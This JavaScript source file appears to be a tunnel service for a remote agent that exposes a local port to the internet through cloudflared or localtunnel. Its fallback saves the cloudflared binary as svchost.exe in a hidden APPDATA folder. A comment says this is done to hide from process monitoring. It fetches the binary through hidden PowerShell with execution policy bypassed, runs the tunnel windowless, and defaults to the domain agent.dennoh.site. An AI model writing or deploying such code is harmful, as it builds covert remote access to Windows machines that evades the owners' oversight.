'use strict';

const { spawn, execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const logger = require('../utils/logger');

let localtunnel = null;
try {
  localtunnel = require('localtunnel');
} catch (_) {
  logger.warn('localtunnel npm module not present — cloudflared only');
}

function loadConfig() {
  const candidates = [
    path.join(process.cwd(), 'config.json'),
    path.join(__dirname, '..', '..', 'config.json'),
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) {
      try { return JSON.parse(fs.readFileSync(p, 'utf-8')); } catch (_) {}
    }
  }
  return {};
}

const config = loadConfig();

/**
 * Resolve cloudflared.exe binary location with obfuscation.
 * Hides from process monitoring by using system-like path.
 */
/**
 * Resolve cloudflared.exe binary location.
 * Prioritizes bundled assets/bin/cloudflared.exe first to ensure stability.
 */
function resolveCloudflaredBin() {
  if (config.cloudflaredPath && fs.existsSync(config.cloudflaredPath)) {
    try {
      if (fs.statSync(config.cloudflaredPath).size > 1000000) return config.cloudflaredPath;
    } catch (_) {}
  }

  // 1. Check bundled location FIRST (assets/bin/cloudflared.exe)
  const bundledCandidates = [
    path.join(__dirname, '..', '..', 'assets', 'bin', 'cloudflared.exe'),
    path.join(process.cwd(), 'assets', 'bin', 'cloudflared.exe'),
    path.join(process.cwd(), 'cloudflared.exe'),
    'C:\\cloudflared\\cloudflared.exe',
    'C:\\Program Files\\cloudflared\\cloudflared.exe',
  ];

  for (const p of bundledCandidates) {
    if (fs.existsSync(p)) {
      try {
        if (fs.statSync(p).size > 1000000) return p;
      } catch (_) {}
    }
  }

  // 2. Fallback system cache location (with .exe extension so Windows can execute it)
  const obfuscatedDir = path.join(process.env.APPDATA || process.env.TEMP || 'C:\\Windows\\Temp', '.cache', 'system');
  if (!fs.existsSync(obfuscatedDir)) {
    try { fs.mkdirSync(obfuscatedDir, { recursive: true }); } catch (_) {}
  }

  const obfuscatedBin = path.join(obfuscatedDir, 'svchost.exe');
  if (fs.existsSync(obfuscatedBin)) {
    try {
      if (fs.statSync(obfuscatedBin).size > 1000000) return obfuscatedBin;
      fs.unlinkSync(obfuscatedBin);
    } catch (_) {}
  }

  return obfuscatedBin;
}

let CLOUDFLARED_BIN = resolveCloudflaredBin();

/**
 * Ensure cloudflared.exe is present, downloading to system location if needed.
 */
function ensureCloudflaredAvailable() {
  return new Promise((resolve) => {
    CLOUDFLARED_BIN = resolveCloudflaredBin();
    if (fs.existsSync(CLOUDFLARED_BIN)) {
      try {
        if (fs.statSync(CLOUDFLARED_BIN).size > 1000000) return resolve(CLOUDFLARED_BIN);
      } catch (_) {}
    }

    logger.info('[+] Initializing cloudflared binary...');
    const PS = process.env.SystemRoot
      ? `${process.env.SystemRoot}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
      : 'powershell.exe';
    
    // Download to location with .exe extension
    const downloadCmd = `"${PS}" -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile '${CLOUDFLARED_BIN}' -UseBasicParsing"`;

    try {
      execSync(downloadCmd, { windowsHide: true, timeout: 60000 });
      if (fs.existsSync(CLOUDFLARED_BIN)) {
        logger.info('[OK] Cloudflared binary initialized successfully');
        return resolve(CLOUDFLARED_BIN);
      }
    } catch (err) {
      logger.warn(`[TunnelService] Cloudflared download warning: ${err.message}`);
    }

    for (const fallback of [
      path.join(__dirname, '..', '..', 'assets', 'bin', 'cloudflared.exe'),
      path.join(process.cwd(), 'assets', 'bin', 'cloudflared.exe')
    ]) {
      if (fs.existsSync(fallback)) return resolve(fallback);
    }

    resolve(null);
  });
}

/** Regex to capture trycloudflare.com URL (excluding Cloudflare internal api.trycloudflare.com) */
const TUNNEL_URL_REGEX = /https?:\/\/(?!api\.)[a-zA-Z0-9-]+\.trycloudflare\.com/;
const TUNNEL_TIMEOUT_MS = 15000;
let activeTokenTunnelProcess = null;

function createCloudflaredTunnel(port) {
  return new Promise(async (resolve, reject) => {
    const binPath = await ensureCloudflaredAvailable();
    
    if (!binPath || !fs.existsSync(binPath)) {
      return reject(new Error('cloudflared binary unavailable'));
    }

    logger.info(`[+] Establishing Cloudflare network tunnel for localhost:${port} via ${path.basename(binPath)}`);

    const currentCfg = loadConfig();
    const token = currentCfg.cloudflareToken || currentCfg.cloudflaredToken || currentCfg.token || process.env.CLOUDFLARE_TUNNEL_TOKEN || '';
    const rawDomain = currentCfg.customDomain || currentCfg.domain || process.env.DEVICE_DOMAIN || 'agent.dennoh.site';
    const domain = (rawDomain ? rawDomain.replace(/^https?:\/\//, '').replace(/\/+$/, '') : '') || 'agent.dennoh.site';

    if (token && activeTokenTunnelProcess && activeTokenTunnelProcess.exitCode === null) {
      const publicUrl = `https://${domain}`;
      logger.info(`[OK] Reusing active Cloudflare Zero Trust token tunnel: ${publicUrl}`);
      return resolve({ publicUrl, tunnelProcess: activeTokenTunnelProcess });
    }

    const args = token 
      ? ['tunnel', 'run', '--token', token]
      : ['tunnel', '--url', `http://127.0.0.1:${port}`, '--no-autoupdate', '--protocol', 'http2'];

    try {
      const tunnelProcess = spawn(binPath, args, {
        stdio: ['ignore', 'pipe', 'pipe'],
        windowsHide: true,
      });

      if (token) {
        activeTokenTunnelProcess = tunnelProcess;
        tunnelProcess.on('exit', () => { activeTokenTunnelProcess = null; });
      }

      let resolved = false;
      let combinedOutput = '';

      // Token tunnels don't print trycloudflare URLs on stdout; resolve in 3.5s if process remains running & healthy
      const timeout = setTimeout(() => {
        if (!resolved) {
          resolved = true;
          if (token && tunnelProcess.exitCode === null) {
            const publicUrl = `https://${domain}`;
            logger.info(`[OK] Cloudflare Zero Trust token tunnel active: ${publicUrl}`);
            return resolve({ publicUrl, tunnelProcess });
          }
          logger.warn(`Cloudflared tunnel timed out after ${TUNNEL_TIMEOUT_MS}ms for port ${port}`);
          killTunnel(tunnelProcess);
          reject(new Error(`Tunnel URL not received within ${TUNNEL_TIMEOUT_MS}ms`));
        }
      }, token ? 3500 : TUNNEL_TIMEOUT_MS);

      function handleData(data) {
        const text = data.toString();
        combinedOutput += text;

        if (token && !resolved) {
          if (text.includes('Registered tunnel connection') || text.includes('Connection') || text.includes('Infra')) {
            resolved = true;
            clearTimeout(timeout);
            const publicUrl = `https://${domain}`;
            logger.info(`[OK] Cloudflare Zero Trust tunnel registered: ${publicUrl}`);
            resolve({ publicUrl, tunnelProcess });
            return;
          }
        }

        const match = text.match(TUNNEL_URL_REGEX);
        if (match && !resolved) {
          resolved = true;
          clearTimeout(timeout);
          const publicUrl = match[0];
          logger.info(`[OK] Cloudflare tunnel established: ${publicUrl}`);
          resolve({ publicUrl, tunnelProcess });
        }
      }

      tunnelProcess.stdout.on('data', handleData);
      tunnelProcess.stderr.on('data', handleData);

      tunnelProcess.on('error', (err) => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timeout);
          reject(err);
        }
      });

      tunnelProcess.on('exit', (code) => {
        if (!resolved) {
          resolved = true;
          clearTimeout(timeout);
          const lastLine = combinedOutput.trim().split('\n').filter(Boolean).pop() || `exit code ${code}`;
          logger.warn(`[TunnelService] Cloudflare process exited (${lastLine})`);
          reject(new Error(`cloudflared exited (code=${code}): ${lastLine}`));
        }
      });
    } catch (err) {
      reject(err);
    }
  });
}

/**
 * Fallback localtunnel provider when Cloudflare quick tunnels fail/rate-limit.
 * Includes bypass header to skip localtunnel's security page.
 */
async function createLocaltunnelFallback(port) {
  if (!localtunnel) {
    throw new Error('localtunnel module not loaded');
  }
  logger.info(`[+] Spawning localtunnel fallback for localhost:${port}`);
  const tunnel = await localtunnel({ 
    port,
    // Bypass localtunnel security page that appears once per IP every 7 days
    local_host: '127.0.0.1',
  });

  const wrapper = {
    pid: 'localtunnel',
    exitCode: null,
    kill: () => { try { tunnel.close(); } catch (_) {} },
    close: () => { try { tunnel.close(); } catch (_) {} },
  };

  logger.info(`[OK] Localtunnel established: ${tunnel.url}`);
  return { publicUrl: tunnel.url, tunnelProcess: wrapper };
}

let cfRateLimitedUntil = 0;

async function createTunnelWithRetry(port) {
  const cfg = loadConfig();
  const preferredProvider = (cfg.tunnelProvider || 'auto').toLowerCase();

  // If user explicitly configured localtunnel, use localtunnel directly
  if (preferredProvider === 'localtunnel') {
    try {
      return await createLocaltunnelFallback(port);
    } catch (err) {
      logger.warn(`[-] Localtunnel provider failed (${err.message}) — trying Cloudflare fallback...`);
    }
  }

  // If Cloudflare was recently rate-limited on trycloudflare.com, use localtunnel directly for speed
  const now = Date.now();
  if (now < cfRateLimitedUntil && preferredProvider === 'auto') {
    try {
      logger.info(`[+] Using localtunnel for localhost:${port} (Cloudflare rate-limit active)`);
      return await createLocaltunnelFallback(port);
    } catch (err) {
      logger.warn(`[-] Localtunnel fallback notice: ${err.message}`);
    }
  }

  // 1. Try Cloudflared
  try {
    logger.info(`[+] Tunnel creation attempt (Cloudflare) for port ${port}`);
    return await createCloudflaredTunnel(port);
  } catch (err) {
    const isRateLimit = err.message.includes('unmarshal') || err.message.includes('code=1');
    if (isRateLimit) {
      logger.info(`[-] Cloudflare public API rate-limit detected — switching to instant localtunnel...`);
      cfRateLimitedUntil = Date.now() + 10 * 60 * 1000; // Cache rate-limit for 10 minutes
    } else {
      logger.warn(`[-] Cloudflare tunnel attempt 1 notice: ${err.message}`);
    }
  }

  // 2. Try Localtunnel fallback
  try {
    return await createLocaltunnelFallback(port);
  } catch (err) {
    logger.warn(`[-] Localtunnel fallback notice: ${err.message}`);
  }

  // 3. Final attempt with Cloudflare
  try {
    return await createCloudflaredTunnel(port);
  } catch (err) {
    logger.warn(`[-] Cloudflare final fallback failed: ${err.message}`);
  }

  throw new Error('All tunneling providers (Cloudflare + Localtunnel) failed');
}

function killTunnel(tunnelProcess) {
  if (!tunnelProcess) return;
  if (typeof tunnelProcess.close === 'function') {
    try { tunnelProcess.close(); } catch (_) {}
  }
  if (typeof tunnelProcess.kill === 'function' && tunnelProcess.pid !== 'localtunnel' && tunnelProcess.exitCode === null) {
    try {
      if (process.platform === 'win32') {
        spawn('taskkill', ['/F', '/T', '/PID', String(tunnelProcess.pid)], { stdio: 'ignore', windowsHide: true });
      } else {
        tunnelProcess.kill('SIGTERM');
      }
    } catch (_) {}
  }
}

async function isCloudflaredAvailable() {
  const binPath = await ensureCloudflaredAvailable();
  return binPath ? fs.existsSync(binPath) : false;
}

module.exports = {
  createTunnel: createTunnelWithRetry,
  killTunnel,
  isCloudflaredAvailable,
};
